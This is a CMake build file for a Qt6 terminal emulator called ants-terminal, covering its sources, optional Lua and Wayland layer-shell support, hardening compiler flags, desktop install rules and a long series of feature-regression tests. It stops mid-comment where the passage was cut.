cmake_minimum_required(VERSION 3.20)
project(ants-terminal VERSION 0.7.69 LANGUAGES CXX)

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)
set(CMAKE_AUTOMOC ON)
set(CMAKE_EXPORT_COMPILE_COMMANDS ON)

# Single source of truth for the application version. Consumed by main.cpp
# (setApplicationVersion) and auditdialog.cpp (SARIF driver.version, UI badge).
# Bump in PROJECT() above; every caller picks up the new value on rebuild.
add_compile_definitions(ANTS_VERSION="${PROJECT_VERSION}")

# Default build type if not specified
if(NOT CMAKE_BUILD_TYPE AND NOT CMAKE_CONFIGURATION_TYPES)
    set(CMAKE_BUILD_TYPE Release CACHE STRING "Build type" FORCE)
endif()

# Qt6 version floor. 6.2 is the first LTS that ships the full set of
# components we need (DBus was stabilised in 6.2; Qt6OpenGLWidgets
# reached feature parity there). Building against older Qt6 releases
# (6.0 / 6.1) compiles but silently loses DBus on some distros and
# trips shader-compile edge cases in the OpenGL renderer — without
# this floor a rolling-distro user with an older qt6-base installed
# alongside a newer one could pick up the wrong one.
find_package(Qt6 6.2 REQUIRED COMPONENTS Core Gui Widgets Network OpenGL OpenGLWidgets DBus Test)

# Lua 5.4 (optional — plugin system)
find_package(PkgConfig)
if(PkgConfig_FOUND)
    pkg_check_modules(LUA lua5.4)
endif()
if(NOT LUA_FOUND)
    # Fallback: try FindLua
    find_package(Lua 5.4 QUIET)
    if(LUA_FOUND)
        set(LUA_INCLUDE_DIRS ${LUA_INCLUDE_DIR})
    endif()
endif()

# LayerShellQt (optional — wlr-layer-shell-v1 anchoring for Quake-mode on
# Wayland compositors). Without it, Quake-mode still works via the regular
# Qt toplevel path on Wayland but positioning/always-on-top behaviour is at
# the mercy of the compositor (no wl_shell equivalent of X11's
# _NET_WM_STATE_ABOVE). With it, we anchor to the top edge via
# zwlr_layer_shell_v1 so the dropdown behaves the way X11 users expect.
# Used only in mainwindow.cpp's setupQuakeMode() — guarded behind the
# ANTS_WAYLAND_LAYER_SHELL compile definition.
find_package(LayerShellQt CONFIG QUIET)

add_executable(ants-terminal
    src/main.cpp
    src/mainwindow.cpp
    src/titlebar.cpp
    src/terminalwidget.cpp
    src/terminalgrid.cpp
    src/vtparser.cpp
    src/ptyhandler.cpp
    src/vtstream.cpp
    src/themes.cpp
    src/config.cpp
    src/commandpalette.cpp
    src/coloredtabbar.cpp
    src/sessionmanager.cpp
    src/aidialog.cpp
    src/sshdialog.cpp
    src/settingsdialog.cpp
    src/toggleswitch.cpp
    src/auditdialog.cpp
    src/auditengine.cpp
    src/clipboardguard.cpp
    src/audithygiene.cpp
    src/featurecoverage.cpp
    src/auditrulequality.cpp
    src/kwinpositiontracker.cpp
    src/claudeallowlist.cpp
    src/claudebgtasks.cpp
    src/claudebgtasksdialog.cpp
    src/roadmapdialog.cpp
    src/claudeintegration.cpp
    src/claudetabtracker.cpp
    src/claudeprojects.cpp
    src/claudetranscript.cpp
    src/globalshortcutsportal.cpp
    src/debuglog.cpp
    src/dialogshowtracer.cpp
    src/remotecontrol.cpp
)

target_link_libraries(ants-terminal PRIVATE
    Qt6::Core
    Qt6::Gui
    Qt6::Widgets
    Qt6::Network
    Qt6::OpenGL
    Qt6::OpenGLWidgets
    Qt6::DBus
    util
)

target_include_directories(ants-terminal PRIVATE src)

# Compiler warnings (required by STANDARDS.md)
#
# -Wformat=2 upgrades -Wformat to include non-literal format strings, %n usage,
# and missing-argument diagnostics — catches the same class of bug the audit
# `format_string` rule flags at the regex layer.
#
# -Wshadow=local (not full -Wshadow) catches a local shadowing another local
# — the actual bug class. Full -Wshadow also flags parameter-vs-member name
# collisions which are pervasive Qt convention (`void setData(QByteArray data)`
# style) and would drown the signal.
#
# -Wnull-dereference catches paths where a pointer known-null reaches a
# dereference — often from Qt getters (findChild, parent, qobject_cast).
#
# -Wconversion / -Wsign-conversion are noisy by nature; kept OFF for now to
# avoid drowning real findings. Flip on individually when a quiet pass is
# worth it (see ROADMAP: "Tighten narrowing conversions").
target_compile_options(ants-terminal PRIVATE
    -Wall -Wextra -Wpedantic
    -Wformat=2 -Wformat-security
    -Wshadow=local -Wnull-dereference
)

# Security hardening
target_compile_options(ants-terminal PRIVATE
    -fstack-protector-strong
    -fstack-clash-protection
    -fcf-protection
    $<$<NOT:$<CONFIG:Debug>>:-U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=3>
    -D_GLIBCXX_ASSERTIONS
)

# ANTS-1116 v1 — optional `ants-helper` CLI binary. Default OFF
# until ANTS-1120 measurement validates the token-saving claim.
option(ANTS_ENABLE_HELPER_CLI
    "Build the ants-helper local-subagent CLI binary (ANTS-1116 v1)"
    OFF)
if(ANTS_ENABLE_HELPER_CLI)
    add_executable(ants-helper
        src/antshelpermain.cpp
        src/antshelper.cpp
    )
    target_link_libraries(ants-helper PRIVATE Qt6::Core)
    target_include_directories(ants-helper PRIVATE src)
    target_compile_options(ants-helper PRIVATE
        -Wall -Wextra -Wpedantic
    )
endif()

# Sanitizer support (development builds)
option(ANTS_SANITIZERS "Enable ASan+UBSan for debugging" OFF)
if(ANTS_SANITIZERS)
    target_compile_options(ants-terminal PRIVATE -fsanitize=address,undefined -fno-omit-frame-pointer)
    target_link_options(ants-terminal PRIVATE -fsanitize=address,undefined)
endif()
target_link_options(ants-terminal PRIVATE
    -Wl,-z,relro
    -Wl,-z,now
    -Wl,-z,noexecstack
)
set_target_properties(ants-terminal PROPERTIES POSITION_INDEPENDENT_CODE ON)

# Lua plugin system (optional)
if(LUA_FOUND)
    target_sources(ants-terminal PRIVATE
        src/luaengine.cpp
        src/pluginmanager.cpp
    )
    target_include_directories(ants-terminal PRIVATE ${LUA_INCLUDE_DIRS})
    target_link_libraries(ants-terminal PRIVATE ${LUA_LIBRARIES})
    target_compile_definitions(ants-terminal PRIVATE ANTS_LUA_PLUGINS=1)
    message(STATUS "Lua ${LUA_VERSION} found — plugin system enabled")
else()
    message(STATUS "Lua 5.4 not found — plugin system disabled")
endif()

# LayerShellQt Wayland anchoring (optional). Added in 0.6.38 for the
# Wayland-native Quake-mode roadmap item. Opt-in via the runtime platform
# check in mainwindow.cpp — builds without it still ship a working Quake
# mode on X11 (via _NET_WM_STATE_ABOVE) and a degraded one on Wayland.
if(LayerShellQt_FOUND)
    target_link_libraries(ants-terminal PRIVATE LayerShellQt::Interface)
    target_compile_definitions(ants-terminal PRIVATE ANTS_WAYLAND_LAYER_SHELL=1)
    message(STATUS "LayerShellQt found — Wayland-native Quake-mode enabled")
else()
    message(STATUS "LayerShellQt not found — Quake-mode on Wayland falls back to the Qt toplevel path")
endif()

include(GNUInstallDirs)

install(TARGETS ants-terminal RUNTIME DESTINATION ${CMAKE_INSTALL_BINDIR})

# ---------------------------------------------------------------------------
# Desktop integration — freedesktop.org spec + AppStream metainfo
# ---------------------------------------------------------------------------
# Reverse-DNS naming (org.ants.Terminal) is what AppStream and .desktop both
# expect — `launchable` in the metainfo ties the two files together by the
# shared stem. Installed under share/ so distro packagers can override with
# DESTDIR for split-staging builds.
install(FILES packaging/linux/org.ants.Terminal.desktop
        DESTINATION ${CMAKE_INSTALL_DATAROOTDIR}/applications)

install(FILES packaging/linux/org.ants.Terminal.metainfo.xml
        DESTINATION ${CMAKE_INSTALL_DATAROOTDIR}/metainfo)

# Hicolor icon theme — six sizes. Install each under the matching
# <size>x<size>/apps/ subdir and RENAME to the generic `ants-terminal.png`
# so the .desktop `Icon=ants-terminal` lookup resolves via the standard
# icon-theme index at runtime.
foreach(_sz IN ITEMS 16 32 48 64 128 256)
    install(FILES assets/ants-terminal-${_sz}.png
            DESTINATION ${CMAKE_INSTALL_DATAROOTDIR}/icons/hicolor/${_sz}x${_sz}/apps
            RENAME ants-terminal.png)
endforeach()

# Man page (section 1 — user commands). Source-of-truth groff lives under
# packaging/linux/; CMake places it at the GNU-standard mandir. man-db /
# mandoc / less-via-man pick it up automatically once the install root is
# on MANPATH (true for /usr and /usr/local out of the box).
install(FILES packaging/linux/ants-terminal.1
        DESTINATION ${CMAKE_INSTALL_MANDIR}/man1)

# Shell completions (bash / zsh / fish). Hand-written for the current
# QCommandLineParser surface (-h/-v/--quake/--dropdown/--new-plugin); each
# file is installed to the conventional vendor location for its shell so
# distro packages don't have to relocate them:
#   bash → ${datarootdir}/bash-completion/completions/ants-terminal
#   zsh  → ${datarootdir}/zsh/site-functions/_ants-terminal
#   fish → ${datarootdir}/fish/vendor_completions.d/ants-terminal.fish
# All three are auto-discovered without requiring the user to source
# anything by hand.
install(FILES packaging/completions/ants-terminal.bash
        DESTINATION ${CMAKE_INSTALL_DATAROOTDIR}/bash-completion/completions
        RENAME ants-terminal)
install(FILES packaging/completions/_ants-terminal
        DESTINATION ${CMAKE_INSTALL_DATAROOTDIR}/zsh/site-functions)
install(FILES packaging/completions/ants-terminal.fish
        DESTINATION ${CMAKE_INSTALL_DATAROOTDIR}/fish/vendor_completions.d)

# OSC 133 shell-integration hook scripts (0.7.0). HMAC-signed shell hooks
# the user sources from ~/.bashrc / ~/.zshrc to authenticate OSC 133
# markers against the verifier in TerminalGrid. See
# packaging/shell-integration/README.md for setup + threat model. Sourced
# manually by the user (not auto-loaded) so they can opt in per shell
# per machine — the verifier is silent unless $ANTS_OSC133_KEY is set.
install(FILES packaging/shell-integration/ants-osc133.bash
              packaging/shell-integration/ants-osc133.zsh
              packaging/shell-integration/README.md
        DESTINATION ${CMAKE_INSTALL_DATAROOTDIR}/ants-terminal/shell-integration)

# ---------------------------------------------------------------------------
# Tests — audit rule fixtures (ctest)
# ---------------------------------------------------------------------------
# Shell-based harness that runs each audit grep pattern against a small
# fixture tree and asserts the expected match counts. Keeps the rule
# regexes in sync with src/auditdialog.cpp; CI runs `ctest` after the
# build to catch drift.
option(ANTS_TESTS "Build tests (includes audit rule regression tests)" ON)
if(ANTS_TESTS)
    enable_testing()
    add_test(NAME audit_rule_fixtures
             COMMAND bash ${CMAKE_SOURCE_DIR}/tests/audit_self_test.sh)
    set_tests_properties(audit_rule_fixtures PROPERTIES
        LABELS "audit;fast"
        TIMEOUT 30)

    # -----------------------------------------------------------------------
    # Feature-conformance tests (tests/features/). See tests/features/README.md
    # for the design rationale. Each test is a standalone executable that
    # links against the minimum set of src/*.cpp objects needed to exercise
    # its feature — NOT the full ants-terminal target (which needs PTY, X11,
    # OpenGL, etc.). Keeps the tests GUI-free and fast enough for CI.
    # -----------------------------------------------------------------------

    # scrollback_redraw — asserts main-screen CSI 2J repaint doesn't double
    # scrollback. Would have caught both the pre-0.6.21 regression AND the
    # incomplete 0.6.21 fix (which covered scrolled-up users but not the
    # bottom-of-screen case). See tests/features/scrollback_redraw/spec.md.
    add_executable(test_scrollback_redraw
        tests/features/scrollback_redraw/test_redraw.cpp
        src/terminalgrid.cpp
        src/vtparser.cpp
    )
    target_link_libraries(test_scrollback_redraw PRIVATE
        Qt6::Core
        Qt6::Gui      # QColor, QImage, transitively required by terminalgrid.h
    )
    target_include_directories(test_scrollback_redraw PRIVATE src)
    target_compile_options(test_scrollback_redraw PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME scrollback_redraw COMMAND test_scrollback_redraw)
    set_tests_properties(scrollback_redraw PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # viewport_stable — asserts that a user scrolled up in history does
    # not see their viewport shift when streaming content arrives. Sibling
    # to scrollback_redraw but covers a different invariant: the
    # redraw test checks "scrollback must not double" (user-at-bottom
    # concern); this test checks "viewport content must not change under
    # the scrolled-up user" (user-scrolled-up concern). Both must hold
    # simultaneously after the 0.6.25 fix. See spec.md §Viewport-stable.
    add_executable(test_viewport_stable
        tests/features/scrollback_redraw/test_viewport_stable.cpp
        src/terminalgrid.cpp
        src/vtparser.cpp
    )
    target_link_libraries(test_viewport_stable PRIVATE
        Qt6::Core
        Qt6::Gui
    )
    target_include_directories(test_viewport_stable PRIVATE src)
    target_compile_options(test_viewport_stable PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME viewport_stable COMMAND test_viewport_stable)
    set_tests_properties(viewport_stable PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # scrollback_frozen_view — locks the 0.6.33 frozen-view invariant.
    # When the user scrolls up, the viewport content is frozen — even
    # screen rows the viewport overlaps stay pinned. Complements
    # viewport_stable (deep-scroll) with the partial-overlap case.
    # See tests/features/scrollback_frozen_view/spec.md.
    add_executable(test_scrollback_frozen_view
        tests/features/scrollback_frozen_view/test_frozen_view.cpp
        src/terminalgrid.cpp
        src/vtparser.cpp
    )
    target_link_libraries(test_scrollback_frozen_view PRIVATE
        Qt6::Core
        Qt6::Gui
    )
    target_include_directories(test_scrollback_frozen_view PRIVATE src)
    target_compile_definitions(test_scrollback_frozen_view PRIVATE
        SRC_TERMINALWIDGET_PATH="${CMAKE_SOURCE_DIR}/src/terminalwidget.cpp")
    target_compile_options(test_scrollback_frozen_view PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME scrollback_frozen_view COMMAND test_scrollback_frozen_view)
    set_tests_properties(scrollback_frozen_view PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # scroll_region_rotate — locks the observable behavior of scrollUp /
    # scrollDown (row motion inside [scrollTop, scrollBottom], outside-
    # region invariance, main-screen scrollback push, alt-screen no push,
    # hyperlink tracking, count>regionHeight clamp). Guards the 0.7.9
    # erase/insert -> std::rotate refactor against silent regression.
    # See tests/features/scroll_region_rotate/spec.md.
    add_executable(test_scroll_region_rotate
        tests/features/scroll_region_rotate/test_scroll_region_rotate.cpp
        src/terminalgrid.cpp
        src/vtparser.cpp
    )
    target_link_libraries(test_scroll_region_rotate PRIVATE
        Qt6::Core
        Qt6::Gui
    )
    target_include_directories(test_scroll_region_rotate PRIVATE src)
    target_compile_options(test_scroll_region_rotate PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME scroll_region_rotate COMMAND test_scroll_region_rotate)
    set_tests_properties(scroll_region_rotate PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # sgr_attribute_reset — asserts every SGR set/reset pair (bold, italic,
    # underline, inverse, strikethrough) + SGR 0 full-reset correctly clear
    # the cell attribute on subsequent writes. See
    # tests/features/sgr_attribute_reset/spec.md. Guards against the
    # 0.6.22 visual-artifact class where decorative SGR attrs leaked
    # across Claude Code's TUI task-list items.
    add_executable(test_sgr_attribute_reset
        tests/features/sgr_attribute_reset/test_sgr_reset.cpp
        src/terminalgrid.cpp
        src/vtparser.cpp
    )
    target_link_libraries(test_sgr_attribute_reset PRIVATE
        Qt6::Core
        Qt6::Gui
    )
    target_include_directories(test_sgr_attribute_reset PRIVATE src)
    target_compile_options(test_sgr_attribute_reset PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME sgr_attribute_reset COMMAND test_sgr_attribute_reset)
    set_tests_properties(sgr_attribute_reset PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # claude_status_bar — asserts the Claude Code status-bar contract:
    # transcript → ClaudeState mapping covers every documented last-event
    # variant, setShellPid clears stale state on tab-switch, and
    # contextUpdated fires with the right percent derived from
    # usage.input_tokens. See tests/features/claude_status_bar/spec.md.
    # Needs Qt6::Network because ClaudeIntegration's MCP server hooks pull
    # in QLocalSocket/QLocalServer which chain through Network.
    add_executable(test_claude_status_bar
        tests/features/claude_status_bar/test_claude_status.cpp
        src/claudeintegration.cpp
    )
    target_link_libraries(test_claude_status_bar PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Network
        Qt6::Test
    )
    target_include_directories(test_claude_status_bar PRIVATE src)
    target_compile_options(test_claude_status_bar PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME claude_status_bar COMMAND test_claude_status_bar)
    set_tests_properties(claude_status_bar PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # claude_plan_mode_detection — asserts that plan-mode toggle events
    # in the JSONL transcript are correctly read (field is `permissionMode`,
    # not `mode`) and that planModeChanged(bool) fires on transition.
    # Anchored to the real Claude Code v2.1.87 JSONL schema. See
    # tests/features/claude_plan_mode_detection/spec.md.
    add_executable(test_claude_plan_mode
        tests/features/claude_plan_mode_detection/test_claude_plan_mode.cpp
        src/claudeintegration.cpp
    )
    target_link_libraries(test_claude_plan_mode PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Network
        Qt6::Test
    )
    target_include_directories(test_claude_plan_mode PRIVATE src)
    target_compile_options(test_claude_plan_mode PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME claude_plan_mode_detection COMMAND test_claude_plan_mode)
    set_tests_properties(claude_plan_mode_detection PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # claude_tab_status_indicator — asserts that the per-tab Claude
    # activity tracker keeps independent state for N shells, that
    # awaitingInput flags override the transcript-derived state without
    # clobbering it, and that plan-mode latching works on the real
    # tracker (not just the shared parser helper). See
    # tests/features/claude_tab_status_indicator/spec.md.
    add_executable(test_claude_tab_tracker
        tests/features/claude_tab_status_indicator/test_claude_tab_tracker.cpp
        src/claudeintegration.cpp
        src/claudetabtracker.cpp
    )
    target_link_libraries(test_claude_tab_tracker PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Network
        Qt6::Test
    )
    target_include_directories(test_claude_tab_tracker PRIVATE src)
    target_compile_options(test_claude_tab_tracker PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_claude_tab_tracker PRIVATE
        ANTS_SOURCE_DIR="${CMAKE_SOURCE_DIR}"
    )
    add_test(NAME claude_tab_status_indicator COMMAND test_claude_tab_tracker)
    set_tests_properties(claude_tab_status_indicator PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # claude_transcript_robustness — asserts that (INV-1/2) the JSONL
    # tail-window reader grows past events larger than 32 KB without
    # dropping state and returns within the 4 MiB cap on pathological
    # inputs, and that (INV-3..6) decodeProjectPath filesystem-probes to
    # preserve hyphens in leaf and intermediate path segments while
    # keeping legacy hyphen-free paths unchanged. See
    # tests/features/claude_transcript_robustness/spec.md.
    add_executable(test_claude_transcript_robustness
        tests/features/claude_transcript_robustness/test_claude_transcript_robustness.cpp
        src/claudeintegration.cpp
    )
    target_link_libraries(test_claude_transcript_robustness PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Network
        Qt6::Test
    )
    target_include_directories(test_claude_transcript_robustness PRIVATE src)
    target_compile_options(test_claude_transcript_robustness PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME claude_transcript_robustness
             COMMAND test_claude_transcript_robustness)
    set_tests_properties(claude_transcript_robustness PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # allowlist_add — asserts (A) rule normalisation, (B) generalisation
    # across every shell splitter, (C) segment-aware subsumption,
    # (D) hook-path button retraction wiring (toolFinished +
    # sessionStopped on ClaudeIntegration, not only
    # claudePermissionCleared on TerminalWidget), (E)
    # openClaudeAllowlistDialog calls show+raise+activateWindow so the
    # dialog becomes the active window on a frameless parent.
    # See tests/features/allowlist_add/spec.md.
    #
    # §D and §E production bindings grep src/mainwindow.cpp at runtime
    # — SRC_MAINWINDOW_PATH baked in as a compile definition below.
    # §E also does an API-level QDialog+QMainWindow lifecycle check,
    # which needs QApplication + offscreen QPA.
    add_executable(test_allowlist_add
        tests/features/allowlist_add/test_allowlist_add.cpp
        src/claudeallowlist.cpp
        src/debuglog.cpp  # 0.7.12: allowlist logs parse-failure guard via ANTS_LOG
    )
    target_link_libraries(test_allowlist_add PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Widgets
    )
    target_include_directories(test_allowlist_add PRIVATE src)
    target_compile_options(test_allowlist_add PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_allowlist_add PRIVATE
        SRC_MAINWINDOW_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
    )
    add_test(NAME allowlist_add COMMAND test_allowlist_add)
    set_tests_properties(allowlist_add PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10
        ENVIRONMENT "QT_QPA_PLATFORM=offscreen")

    # allowlist_perms_postcommit — asserts Claude allowlist settings file
    # lands 0600 after saveSettings(), covering the QSaveFile-rename edge
    # case on filesystems that don't preserve fd perms across rename
    # (FAT/exFAT, some SMB/NFS servers, Qt copy+unlink fallback).
    # Locks the belt-and-suspenders post-commit setOwnerOnlyPerms call
    # on m_settingsPath in saveSettings(). See
    # tests/features/allowlist_perms_postcommit/spec.md.
    add_executable(test_allowlist_perms_postcommit
        tests/features/allowlist_perms_postcommit/test_allowlist_perms_postcommit.cpp
        src/claudeallowlist.cpp
        src/debuglog.cpp
    )
    target_link_libraries(test_allowlist_perms_postcommit PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Widgets
    )
    target_include_directories(test_allowlist_perms_postcommit PRIVATE src)
    target_compile_options(test_allowlist_perms_postcommit PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_allowlist_perms_postcommit PRIVATE
        SRC_CLAUDEALLOWLIST_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudeallowlist.cpp"
    )
    add_test(NAME allowlist_perms_postcommit
             COMMAND test_allowlist_perms_postcommit)
    set_tests_properties(allowlist_perms_postcommit PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10
        ENVIRONMENT "QT_QPA_PLATFORM=offscreen")

    # shell_command_wiring — asserts the Settings → General shell picker
    # actually takes effect: TerminalWidget::startShell carries a shell
    # param, forwards it to VtStream::start (instead of hardcoded
    # QString()), and every MainWindow production call site passes
    # m_config.shellCommand(). Plus a Config round-trip for the
    # serialization leg. Pure source-grep + Config round-trip; no PTY
    # fork, no widget harness. See
    # tests/features/shell_command_wiring/spec.md.
    add_executable(test_shell_command_wiring
        tests/features/shell_command_wiring/test_shell_command_wiring.cpp
        src/config.cpp
        src/debuglog.cpp
    )
    target_link_libraries(test_shell_command_wiring PRIVATE
        Qt6::Core
    )
    target_include_directories(test_shell_command_wiring PRIVATE src)
    target_compile_options(test_shell_command_wiring PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_shell_command_wiring PRIVATE
        SRC_TERMINALWIDGET_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/terminalwidget.h"
        SRC_TERMINALWIDGET_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/terminalwidget.cpp"
        SRC_MAINWINDOW_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
    )
    add_test(NAME shell_command_wiring COMMAND test_shell_command_wiring)
    set_tests_properties(shell_command_wiring PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # tab_rename_persist — asserts the right-click "Rename Tab…" pin
    # survives app restart. V3 session-file schema: pinnedTitle is
    # appended after cwd; V2 files continue to load with the out-param
    # left empty. MainWindow saveAllSessions threads the pin into
    # saveSession; restoreSessions pulls it back and populates
    # m_tabTitlePins so the titleChanged handler and updateTabTitles
    # tick both honor it after restart. See
    # tests/features/tab_rename_persist/spec.md.
    add_executable(test_tab_rename_persist
        tests/features/tab_rename_persist/test_tab_rename_persist.cpp
        src/sessionmanager.cpp
        src/terminalgrid.cpp
        src/vtparser.cpp
    )
    target_link_libraries(test_tab_rename_persist PRIVATE
        Qt6::Core
        Qt6::Gui
    )
    target_include_directories(test_tab_rename_persist PRIVATE src)
    target_compile_options(test_tab_rename_persist PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_tab_rename_persist PRIVATE
        SRC_SESSIONMANAGER_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/sessionmanager.h"
        SRC_MAINWINDOW_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
    )
    add_test(NAME tab_rename_persist COMMAND test_tab_rename_persist)
    set_tests_properties(tab_rename_persist PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # status_bar_elision — asserts ElidedLabel's elision policy:
    # short text never elides, over-cap text does, and minimumSizeHint
    # returns at least the full-text width (capped at maximumWidth) so
    # QStatusBar's QBoxLayout can't squeeze a short-text chip down to
    # "…". Guards the 0.6.29 regression fix for the git branch chip
    # user-reported as rendering "…" instead of "main". ElidedLabel is
    # header-only, so no src/*.cpp is linked — the test exercises the
    # widget directly inside a QMainWindow+QStatusBar harness to
    # reproduce the tight-layout squeeze. Needs Qt6::Widgets because
    # we instantiate a real QMainWindow/QStatusBar. Runs under
    # QT_QPA_PLATFORM=offscreen in CI so no display is required. See
    # tests/features/status_bar_elision/spec.md.
    add_executable(test_status_bar_elision
        tests/features/status_bar_elision/test_status_bar_elision.cpp
    )
    target_link_libraries(test_status_bar_elision PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Widgets
    )
    target_include_directories(test_status_bar_elision PRIVATE src)
    target_compile_options(test_status_bar_elision PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME status_bar_elision COMMAND test_status_bar_elision)
    set_tests_properties(status_bar_elision PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10
        ENVIRONMENT "QT_QPA_PLATFORM=offscreen")

    # review_changes_click — asserts the two API-level invariants that
    # make the Review Changes status-bar button produce a visible
    # dialog:
    #   (A) QDialog on a frameless QMainWindow parent needs show() +
    #       raise() + activateWindow() to reliably become the active
    #       window — show() alone is WM-dependent and flaky on KWin.
    #   (B) The focus-redirect lambda at mainwindow.cpp:~411 queues a
    #       deferred setFocus() on the terminal when status-bar chrome
    #       takes focus; the fire-time re-check must skip the refocus
    #       when a QDialog has since become active, so the dialog's
    #       input focus isn't stolen (which would re-raise the main
    #       window over it on KWin).
    # Regression test for user report "Review Changes button does
    # nothing when I click it" — the button IS active and git DOES
    # detect changes, but the dialog was created behind the main
    # window. See tests/features/review_changes_click/spec.md.
    # Pure API-level harness — no src/*.cpp linked; topology is
    # reproduced with QMainWindow + QStatusBar + QDialog + QTimer.
    add_executable(test_review_changes_click
        tests/features/review_changes_click/test_review_changes_click.cpp
    )
    target_link_libraries(test_review_changes_click PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Widgets
    )
    target_include_directories(test_review_changes_click PRIVATE src)
    target_compile_options(test_review_changes_click PRIVATE
        -Wall -Wextra -Wpedantic
    )
    # Production-binding check: the test opens src/mainwindow.cpp at
    # runtime to verify showDiffViewer still calls raise() and
    # activateWindow(). Bake the absolute source path in at compile
    # time so the test runs correctly from the build directory.
    target_compile_definitions(test_review_changes_click PRIVATE
        SRC_MAINWINDOW_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
    )
    add_test(NAME review_changes_click COMMAND test_review_changes_click)
    set_tests_properties(review_changes_click PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10
        ENVIRONMENT "QT_QPA_PLATFORM=offscreen")

    # tab_color — asserts ColoredTabBar stores per-tab colours via
    # QTabBar::tabData so they survive drag-reorder (moveTab) and
    # auto-drop on removeTab. Guards the 0.6.23 fix for "right-click
    # tab, choose colour, nothing happens" which was caused by
    # stylesheet winning over setTabTextColor AND by index-keyed
    # MainWindow storage going stale on reorder. See
    # tests/features/tab_color/spec.md.
    add_executable(test_tab_color
        tests/features/tab_color/test_tab_color.cpp
        src/coloredtabbar.cpp
        src/config.cpp
        src/debuglog.cpp  # 0.7.12: config.cpp logs load/save failures via ANTS_LOG
    )
    target_link_libraries(test_tab_color PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Widgets
    )
    target_include_directories(test_tab_color PRIVATE src)
    target_compile_options(test_tab_color PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME tab_color COMMAND test_tab_color)
    set_tests_properties(tab_color PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # session_persistence_default — locks in the 0.6.43 fix that flipped
    # Config::sessionPersistence()'s default from false → true. Pre-fix,
    # fresh users (no `session_persistence` key in config.json) silently
    # had tabs discarded on exit. Exercises Config's public API directly
    # against an isolated XDG_CONFIG_HOME, asserting the full truth table
    # {missing, false, true} → {true, false, true}. See
    # tests/features/session_persistence_default/spec.md.
    add_executable(test_session_persistence_default
        tests/features/session_persistence_default/test_session_persistence_default.cpp
        src/config.cpp
        src/debuglog.cpp  # 0.7.12: config.cpp logs load/save failures via ANTS_LOG
    )
    target_link_libraries(test_session_persistence_default PRIVATE
        Qt6::Core
    )
    target_include_directories(test_session_persistence_default PRIVATE src)
    target_compile_options(test_session_persistence_default PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME session_persistence_default
             COMMAND test_session_persistence_default)
    set_tests_properties(session_persistence_default PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # vtparser_simd_scan — asserts that VtParser's SIMD fast-path (0.7.0
    # performance work, scans 16 bytes at a time for the next non-printable-
    # ASCII byte via SSE2/NEON) emits an action stream byte-identical to the
    # scalar path for every feed strategy: single-shot, byte-by-byte, and
    # pseudo-random chunking. Guards against the scan boundary diverging
    # from scalar semantics at any offset mod 16. See
    # tests/features/vtparser_simd_scan/spec.md.
    add_executable(test_vtparser_simd_scan
        tests/features/vtparser_simd_scan/test_vtparser_simd.cpp
        src/vtparser.cpp
    )
    target_include_directories(test_vtparser_simd_scan PRIVATE src)
    target_compile_options(test_vtparser_simd_scan PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME vtparser_simd_scan COMMAND test_vtparser_simd_scan)
    set_tests_properties(vtparser_simd_scan PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # vt_osc_esc_discard — locks the 0.7.53 fix for ESC inside OSC /
